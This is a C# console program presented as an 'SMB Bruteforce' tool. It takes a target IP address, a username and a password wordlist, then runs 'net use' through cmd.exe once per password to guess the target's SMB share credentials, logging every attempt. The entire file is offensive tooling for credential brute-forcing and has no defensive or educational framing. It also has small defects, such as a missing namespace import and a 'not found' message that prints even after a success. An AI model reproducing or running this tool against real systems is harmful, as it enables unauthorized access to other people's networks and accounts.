using System;
using System.IO;

class SMBBruteforce
{
    static void Main(string[] args)
    {
        Console.Title = "SMB Bruteforce - by Lira";
        Console.ForegroundColor = ConsoleColor.Green;
        
        string ip = Prompt("Enter IP Address: ");
        if (!ValidateIP(ip))
        {
            Console.WriteLine("Invalid IP address. Please enter a valid IP address.");
            return;
        }

        string user = Prompt("Enter Username: ");
        string wordlistPath = Prompt("Enter Password List (with full path): ");

        if (!File.Exists(wordlistPath))
        {
            Console.WriteLine("Password list file not found. Please enter a valid file path.");
            return;
        }

        string[] passwords = File.ReadAllLines(wordlistPath);
        int total = passwords.Length;

        string logFilePath = "bruteforce_log.txt";
        using (StreamWriter log = new StreamWriter(logFilePath))
        {
            log.WriteLine("SMB Bruteforce Log");
            log.WriteLine($"Target IP: {ip}");
            log.WriteLine($"Username: {user}");
            log.WriteLine($"Wordlist: {wordlistPath}");
            log.WriteLine();

            for (int i = 0; i < total; i++)
            {
                string password = passwords[i];
                if (AttemptLogin(ip, user, password))
                {
                    Console.WriteLine($"Password Found! {password}");
                    log.WriteLine($"Password Found! {password}");
                    break;
                }

                int percent = (i + 1) * 100 / total;
                Console.WriteLine($"Progress: {percent}% [{i + 1} / {total} attempts]");
                log.WriteLine($"[ATTEMPT {i + 1}] [{password}]");
            }

            Console.WriteLine("Password not Found :(");
            log.WriteLine("Password not Found :(");
        }
    }

    static string Prompt(string message)
    {
        Console.Write(message);
        return Console.ReadLine();
    }

    static bool ValidateIP(string ip)
    {
        string[] parts = ip.Split('.');
        if (parts.Length != 4)
            return false;

        foreach (string part in parts)
        {
            if (!int.TryParse(part, out int num))
                return false;
            if (num < 0 || num > 255)
                return false;
        }

        return true;
    }

    static bool AttemptLogin(string ip, string user, string password)
    {
        string command = $"/C net use \\\\{ip} /user:{user} \"{password}\"";
        var processInfo = new ProcessStartInfo("cmd.exe", command)
        {
            CreateNoWindow = true,
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };

        using (var process = Process.Start(processInfo))
        {
            process.WaitForExit();
            return process.ExitCode == 0;
        }
    }
}
